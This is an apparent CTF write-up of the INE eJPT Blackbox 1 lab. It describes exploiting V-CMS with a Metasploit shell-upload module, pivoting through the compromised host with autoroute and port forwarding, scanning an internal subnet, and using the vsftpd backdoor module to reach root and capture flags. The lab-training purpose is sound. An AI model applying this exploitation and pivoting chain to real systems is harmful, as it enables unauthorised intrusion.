---
title: "[eJPT] INE Blackbox 1"
author: Tri Nguyen
date: 2022-01-11 14:30:00 -0700
categories: [CTF, Write Up]
tags: [ctf, write-up, ine, ejpt]
---

# INE Blackbox 1

## Enumeration 1

- Target: demo.ine.local (call this demo1)

- Our machine's `eth1`: 192.141.206.2

- `ping demo.ine.local` ---> 192.141.206.3

- Our target is running V-CMS v1.0

## Exploitation 1

- Search for V-CMS exploit in Metasploit, we can see a PHP shell upload vulnerability.

- We need to change these following options:

```
RHOSTS: 192.141.206.3 # our target
TARGETURI: /
LHOST: 192.141.206.2 # our machine
```

- `getuid` in Meterpreter ---> root (0)

- If we go to `/root` , we can see the flag being `4f96a3e848d233d5af337c440e50fe3d`

## Enumeration 2

- If we `cat /etc/hosts` or `ifconfig` we can see demo1 has another IP of 192.79.65.2 . So our second target must be on the same network.

`inet 192.79.65.2  netmask 255.255.255.0  broadcast 192.79.65.255`

- We need to route this IP. https://www.infosecmatter.com/metasploit-module-library/?mm=post/multi/manage/autoroute

- We run `meterpreter > run autoroute -s 192.79.65.0`

- **SOMEHOW THIS DOESN'T WORK** Then background the current session, run `nmap -v -sn 192.79.65.0/24` ----> We will see 192.79.65.1 is up

- **THIS WORK** Using `auxiliary/scanner/portscan/tcp` 

```
PORTS: 80,8080, 445, 21, 22
RHOSTS: 192.79.65.1-10
```

- Port 21 on 192.79.65.3 is open, we need to port forward it to our machine.

- We use this https://www.offensive-security.com/metasploit-unleashed/portfwd/

- In Meterpreter `portfwd add -l 1234 -p 21 -r 192.79.65.3`

- To detech the version I used `nmap -p 1234 -sV localhost`

## Exploitation 2

- You can search for `vsftpd 2.0.8 exploit metasploit` on Google or in Metasploit, just `search vsftpd`

- We use `exploit/unix/ftp/vsftpd_234_backdoor`

- If you set the options to localhost:1234 it won't work.

- The correct options:

```
RHOSTS: 192.79.65.3
RHOST: 21
```

- `cat /root/flag.txt` ---> Flag `58c7c29a8ab5e7c4c06256b954947f9a`
